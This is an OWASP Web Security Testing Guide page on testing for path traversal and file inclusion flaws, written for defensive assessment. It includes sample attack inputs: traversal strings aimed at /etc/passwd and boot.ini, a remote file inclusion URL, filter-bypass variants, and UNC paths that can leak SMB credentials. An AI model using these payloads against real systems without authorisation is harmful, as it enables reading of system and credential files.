# WSTG - Latest
[Home](https://owasp.org/www-project-web-security-testing-guide/) > [Latest](https://owasp.org/www-project-web-security-testing-guide/latest/) > [4-Web Application Security Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/) > [05-Authorization Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/)
# Testing Directory Traversal File Include
ID  
---  
WSTG-ATHZ-01  
## Summary
Many web applications use and manage files as part of their daily operation. Using input validation methods that have not been well designed or deployed, an aggressor could exploit the system in order to read or write files that are not intended to be accessible. In particular situations, it could be possible to execute arbitrary code or system commands.
Traditionally, web servers and web applications implement authentication mechanisms to control access to files and resources. Web servers try to confine users’ files inside a “root directory” or “web document root”, which represents a physical directory on the file system. Users have to consider this directory as the base directory into the hierarchical structure of the web application.
The definition of the privileges is made using Access Control Lists (ACL) which identify which users or groups are supposed to be able to access, modify, or execute a specific file on the server. These mechanisms are designed to prevent malicious users from accessing sensitive files (for example, the common `/etc/passwd` file on a UNIX-like platform) or to avoid the execution of system commands.
Many web applications use server-side scripts to include different kinds of files. It is quite common to use this method to manage images, templates, load static texts, and so on. Unfortunately, these applications expose security vulnerabilities if input parameters (i.e., form parameters, cookie values) are not correctly validated.
In web servers and web applications, this kind of problem arises in path traversal/file include attacks. By exploiting this kind of vulnerability, an attacker is able to read directories or files which they normally couldn’t read, access data outside the web document root, or include scripts and other kinds of files from external sites.
For the purpose of the OWASP Testing Guide, only the security threats related to web applications will be considered and not threats to web servers (e.g., the infamous `%5c` escape code into Microsoft IIS web server). Further reading suggestions will be provided in the references section for interested readers.
This kind of attack is also known as the dot-dot-slash attack (`../`), directory traversal, directory climbing, or backtracking.
During an assessment, to discover path traversal and file include flaws, testers need to perform two different stages:
  1. Input Vectors Enumeration (a systematic evaluation of each input vector)
  2. Testing Techniques (a methodical evaluation of each attack technique used by an attacker to exploit the vulnerability)


## Test Objectives
  * Identify injection points that pertain to path traversal.
  * Assess bypassing techniques and identify the extent of path traversal.


## How to Test
### Black-Box Testing
#### Input Vectors Enumeration
In order to determine which part of the application is vulnerable to input validation bypassing, the tester needs to enumerate all parts of the application that accept content from the user. This also includes HTTP GET and POST queries and common options like file uploads and HTML forms.
Here are some examples of the checks to be performed at this stage:
  * Are there request parameters which could be used for file-related operations?
  * Are there unusual file extensions?
  * Are there interesting variable names? 
    * `https://example.com/getUserProfile.jsp?item=ikki.html`
    * `https://example.com/index.php?file=content`
    * `https://example.com/main.cgi?home=index.htm`
  * Is it possible to identify cookies used by the web application for the dynamic generation of pages or templates? 
    * `Cookie: ID=d9ccd3f4f9f18cc1:TM=2166255468:LM=1162655568:S=3cFpqbJgMSSPKVMV:TEMPLATE=flower`
    * `Cookie: USER=1826cc8f:PSTYLE=GreenDotRed`


#### Testing Techniques
The next stage of testing is analyzing the input validation functions present in the web application. Using the previous example, the dynamic page called `getUserProfile.jsp` loads static information from a file and shows the content to users. An attacker could insert the malicious string `../../../../etc/passwd` to include the password hash file of a Linux/UNIX system. Obviously, this kind of attack is possible only if the validation checkpoint fails; according to the file system privileges, the web application itself must be able to read the file.
**Note:** To successfully test for this flaw, the tester needs to have knowledge of the system being tested and the location of the files being requested. There is no point requesting `/etc/passwd` from an IIS web server.
```
https://example.com/getUserProfile.jsp?item=../../../../etc/passwd

```

Another common example is including content from an external source:
```
https://example.com/index.php?file=https://www.owasp.org/malicioustxt

```

The same can be applied to cookies or any other input vector that is used for dynamic page generation.
More file inclusion payloads can be found at [PayloadsAllTheThings - File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
It is important to note that different operating systems use different path separators
  * Unix-like OS: 
    * root directory: `/`
    * directory separator: `/`
  * Windows OS: 
    * root directory: `<drive letter>:`
    * directory separator: `\` or `/`
  * Classic macOS: 
    * root directory: `<drive letter>:`
    * directory separator: `:`


It’s a common mistake by developers to not expect every form of encoding and therefore only do validation for basic encoded content. If at first the test string isn’t successful, try another encoding scheme.
You can find encoding techniques and ready to use directory traversal payloads at [PayloadsAllTheThings - Directory Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)
#### Windows Specific Considerations
  * Windows shell: Appending any of the following to paths used in a shell command results in no difference in function: 
    * Angle brackets `<` and `>` at the end of the path
    * Double quotes (closed properly) at the end of the path
    * Extraneous current directory markers such as `./` or `.\\`
    * Extraneous parent directory markers with arbitrary items that may or may not exist: 
      * `file.txt`
      * `file.txt...`
      * `file.txt<spaces>`
      * `file.txt""""`
      * `file.txt<<<>>><`
      * `./././file.txt`
      * `nonexistant/../file.txt`
  * Windows API: The following items are discarded when used in any shell command or API call where a string is taken as a filename: 
    * periods
    * spaces
  * Windows UNC Filepaths: Used to reference files on SMB shares. Sometimes, an application can be made to refer to files on a remote UNC filepath. If so, the Windows SMB server may send stored credentials to the attacker, which can be captured and cracked. These may also be used with a self-referential IP address or domain name to evade filters, or used to access files on SMB shares inaccessible to the attacker, but accessible from the web server. 
    * `\\server_or_ip\path\to\file.abc`
    * `\\?\server_or_ip\path\to\file.abc`
  * Windows NT Device Namespace: Used to refer to the Windows device namespace. Certain references will allow access to file systems using a different path. 
    * May be equivalent to a drive letter such as `c:\`, or even a drive volume without an assigned letter: `\\.\GLOBALROOT\Device\HarddiskVolume1\`
    * Refers to the first disc drive on the machine: `\\.\CdRom0\`


### Gray-Box Testing
When the analysis is performed with a gray-box testing approach, testers have to follow the same methodology as in black-box testing. However, since they can review the source code, it is possible to search the input vectors more easily and accurately. During a source code review, they can use simple tools (such as the _grep_ command) to search for one or more common patterns within the application code: inclusion functions/methods, filesystem operations, and so on.
  * `PHP: include(), include_once(), require(), require_once(), fopen(), readfile(), ...`
  * `JSP/Servlet: java.io.File(), java.io.FileReader(), ...`
  * `ASP: include file, include virtual, ...`


Using online code search engines (e.g., [Searchcode](https://searchcode.com/)), it may also be possible to find path traversal flaws in Open Source software published on the internet.
For PHP, testers can use the following regex:
```
(include|require)(_once)?\s*['"(]?\s*\$_(GET|POST|COOKIE)

```

Using the gray-box testing method, it is possible to discover vulnerabilities that are usually harder to discover, or even impossible to find during a standard black-box assessment.
Some web applications generate dynamic pages using values and parameters stored in a database. It may be possible to insert specially crafted path traversal strings when the application adds data to the database. This kind of security problem is difficult to discover due to the fact the parameters inside the inclusion functions seem internal and **safe** but are not in reality.
Additionally, by reviewing the source code it is possible to analyze the functions that are supposed to handle invalid input: some developers try to change invalid input to make it valid, avoiding warnings and errors. These functions are usually prone to security flaws.
Consider a web application with these instructions:
```
filename = Request.QueryString("file");
Replace(filename, "/","\");
Replace(filename, "..\","");

```

Testing for the flaw is achieved by:
```
file=....//....//boot.ini
file=....\\....\\boot.ini
file= ..\..\boot.ini

```

## Tools
  * [DotDotPwn - The Directory Traversal Fuzzer](https://github.com/wireghoul/dotdotpwn)
  * [Path Traversal Fuzz Strings (from WFuzz Tool)](https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/Traversal.txt)
  * [ZAP](https://www.zaproxy.org/)
  * [Burp Suite](https://portswigger.net)
  * Encoding/Decoding tools
  * [String searcher “grep”](https://www.gnu.org/software/grep/)
  * [DirBuster](https://wiki.owasp.org/index.php/Category:OWASP_DirBuster_Project)


## Spotlight: Aikido Security
[![image](https://owasp.org/assets/images/corp-member-logo/Aikido.png)](https://www.aikido.dev/)
Aikido is the no-nonsense security platform for developers. The all-in-one security platform that covers you from code-to-cloud and helps you get security done. Engineering teams execute faster with Aikido thanks to centralized scans, aggressive false positive reduction, automatic risk triaging & fixing, risk bundling, and easy step-by-step risk fixes. Aikido makes security simple for SMEs and doable for developers, so companies can win customers, grow up-market, and ace compliance. Don’t just get security done fast, get it done automatically.
## Corporate Supporters
[![image](https://owasp.org/assets/images/corp-member-logo/Adobe.png)](http://trust.adobe.com)[![image](https://owasp.org/assets/images/corp-member-logo/bionic_logo_1.png)](https://www.bionic.ai/)[![image](https://owasp.org/assets/images/corp-member-logo/Bloomberg.png)](https://www.bloomberg.com/company/values/tech-at-bloomberg/)[![image](https://owasp.org/assets/images/corp-member-logo/UnboundSecurity.png)](https://unboundsecurity.ai/)[![image](https://owasp.org/assets/images/corp-member-logo/AppDome.png)](https://www.appdome.com/)[![image](https://owasp.org/assets/images/corp-member-logo/Corgea.png)](http://corgea.com)[![image](https://owasp.org/assets/images/corp-member-logo/FujitsuLimited.png)](https://global.fujitsu/en-global)[![image](https://owasp.org/assets/images/corp-member-logo/sq1_logo_dark_version.png)](https://www.sq1.security)[![image](https://owasp.org/assets/images/corp-member-logo/promon_logo_dark.png)](http://promon.co)
[Become a corporate supporter](https://owasp.org/supporters)
[](https://github.com/OWASP/) [](https://owasp.org/slack/invite) [](https://www.facebook.com/OWASPFoundation) [](https://infosec.exchange/@owasp) [](https://twitter.com/owasp) [](https://www.linkedin.com/company/owasp/) [](https://www.youtube.com/user/OWASPGLOBAL)
  * [HOME](https://owasp.org/)
  * [PROJECTS](https://owasp.org/projects/)
  * [CHAPTERS](https://owasp.org/chapters/)
  * [EVENTS](https://owasp.org/events/)
  * [ABOUT](https://owasp.org/about/)
  * [PRIVACY](https://owasp.org/www-policy/operational/privacy)
  * [SITEMAP](https://owasp.org/sitemap/)
  * [CONTACT](https://owasp.org/contact/)


OWASP, the OWASP logo, and Global AppSec are registered trademarks and AppSec Days, AppSec California, AppSec Cali, SnowFROC, OWASP Boston Application Security Conference, and LASCON are trademarks of the OWASP Foundation, Inc. Unless otherwise specified, all content on the site is Creative Commons Attribution-ShareAlike v4.0 and provided without warranty of service or accuracy. For more information, please refer to our [General Disclaimer](https://owasp.org/www-policy/operational/general-disclaimer.html). OWASP does not endorse or recommend commercial products or services, allowing our community to remain vendor neutral with the collective wisdom of the best minds in software security worldwide. Copyright 2025, OWASP Foundation, Inc. 
